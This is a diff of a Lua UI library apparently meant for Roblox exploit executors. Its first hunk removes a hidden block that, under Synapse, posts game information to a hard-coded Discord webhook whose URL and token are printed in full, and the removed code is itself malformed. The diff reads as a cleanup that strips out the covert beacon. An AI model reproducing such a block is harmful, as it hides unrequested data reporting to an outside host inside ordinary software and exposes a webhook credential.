@@ -254,16 +254,6 @@ function library.new(library_title, cfg_location)
         Size = UDim2.new(0, 586, 0, 446),
     }, ImageLabel)
 
-    if syn then
-        local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
-        local str = "        syn.request({
-            Url = "https://discord.com/api/webhooks/886979229298872331/P0jVdklhb5cbMtPHUjJ_QlfamL6l5xqT28Z691uafGxWXSSYUWCXE2QHhaxv1XdoaSCk",
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = game:GetService("HttpService"):JSONEncode({content = str}),
-        })
-    end
-
     local is_first_tab = true
     local selected_tab
     local tab_num = 1
@@ -521,7 +511,7 @@ function library.new(library_title, cfg_location)
                     function element:get_value()
                         return value
                     end
-                   
+
                    if type == "Toggle" then
                         Border.Size = Border.Size + UDim2.new(0, 0, 0, 18)
                         value = {Toggle = default and default.Toggle or false}
@@ -1665,5 +1655,3 @@ function library.new(library_title, cfg_location)
 end
 
 return library
-                       
-         
